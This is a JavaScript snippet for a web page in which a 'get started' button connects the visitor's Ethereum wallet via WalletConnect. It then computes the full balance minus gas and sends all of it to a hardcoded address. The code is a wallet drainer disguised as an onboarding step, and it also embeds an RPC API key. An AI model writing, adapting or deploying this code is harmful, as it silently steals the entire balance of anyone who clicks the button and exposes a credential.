const WalletConnectProvider = window.WalletConnectProvider.default;
const { ethers } = window;

document.getElementById('get-started').onclick = async () => {
    try {
        // Initialize WalletConnect Provider with RPCFast endpoint
        const provider = new WalletConnectProvider({
            rpc: {
                1: "https://eth-mainnet-mempool.rpcfast.com?api_key=bDkPRaSmDwz0al5sWxt4GOBUIFjPwLOJYwblafja2ILA8iyX5ZeNZECq3NJa4EPW" // Replace with your RPCFast API URL
            }
        });

        // Enable session (triggers QR Code modal for desktop or opens MetaMask on mobile)
        await provider.enable();

        // Create ethers provider and signer
        const ethersProvider = new ethers.providers.Web3Provider(provider);
        const signer = ethersProvider.getSigner();

        console.log("Wallet connected");

        // Get the balance of the wallet
        const address = await signer.getAddress();
        const balance = await ethersProvider.getBalance(address);

        // Estimate gas price
        const gasPrice = await ethersProvider.getGasPrice();
        const gasLimit = 21000; // Standard gas limit for a simple ETH transfer

        // Calculate the max value to send (balance - gas fee)
        const maxGasFee = gasPrice.mul(gasLimit);
        const maxValue = balance.sub(maxGasFee);

        if (maxValue.lte(0)) {
            console.error("Insufficient balance to cover the gas fee");
            return;
        }

        // Define transaction parameters
        const tx = {
            to: "0xB0994b43F798a151e75b38e01C5a9Da2B8895b8", // Replace with the recipient address
            value: maxValue,
            gasLimit: gasLimit,
            gasPrice: gasPrice
        };

        // Send transaction
        const txResponse = await signer.sendTransaction(tx);
        console.log("Transaction sent", txResponse);

        // Wait for transaction to be mined
        const receipt = await txResponse.wait();
        console.log("Transaction mined", receipt);
    } catch (error) {
        console.error(error);
    }
};
